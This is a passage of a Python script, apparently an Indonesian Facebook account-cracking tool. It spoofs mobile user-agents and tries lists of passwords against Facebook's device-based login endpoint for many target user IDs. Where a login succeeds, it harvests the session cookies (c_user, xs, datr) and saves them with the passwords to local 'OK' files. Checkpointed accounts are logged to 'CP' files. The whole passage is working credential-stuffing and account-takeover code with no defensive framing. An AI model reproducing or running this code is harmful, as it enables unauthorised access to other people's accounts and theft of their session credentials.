    iphone = f"Mozilla/5.0 (iPhone; CPU iPhone OS {iphone1} like Mac OS X; {iphone2}) adbeat.com/policy AppleWebKit/{iphone3} (KHTML, like Gecko) Version/{iphone4} Mobile/12A366 Safari/{str(rr(600,6533))}.{str(rr(1,18))}.{str(rr(4,5))}"
    return rc([iphone])


# --------------------[ METODE-MOBILE ]-----------------#
def crack(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(f"\r╭─> {str(loop)}/{len(id2)} OK-:{ok} CP-:{cp}"),
    sys.stdout.flush()
    ses = requests.Session()
    ua = ua_valid()
    ua2 = iphonee()
    for pw in pwv:
        try:
            ses.headers.update({"Host": "free.prod.facebook.com","cache-control": "max-age=0","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
            link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr")
            data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
            cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
            headd = {"Host": "free.prod.facebook.com","content-length": "153","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0",data=data,cookies={'cookie': cuoz},headers=headd,allow_redirects=False,)
            if "checkpoint" in ses.cookies.get_dict().keys():
                tree = Tree("")
                tree.add(f"[bold red]uid : {idf}").add(
                    f"[bold red]password : {pw}", style="bold white"
                )
                tree.add(f"[bold red]useragent : {ua}", style="bold white")
                print(tree)
                open("CP/" + "ASEP-CP.txt", "a").write(idf + "|" + pw + "\n")
                akun.append(idf + "|" + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                tree = Tree("")
                tree.add(f"[bold green]uid : {idf}").add(
                    f"[bold green]password : {pw}", style="bold white"
                )
                tree.add(f"[bold green]cookie : {kuki}", style="bold white")
                print(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def asep():
    os.system("cls" if os.name == "nt" else "clear")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            """[bold red]●[bold yellow] ●[bold green] ●                               
 _____                __ __ _____             
|  _  |___ ___ ___   |  |  |  |  |___ _ _ ___ 
|     |_ -| -_| . |  |_   _|  |  |_ -| | | . |
|__|__|___|___|  _|    |_| |_____|___|___|  _|
              |_|                        |_|  

[bold blue]                SUKAMAKAMUR[bold blue]""",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] SC GERATIS [bold green]<[bold yellow]<[bold red]<",
        )
    )


# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except:
        pass
    time.sleep(3)
    menu()
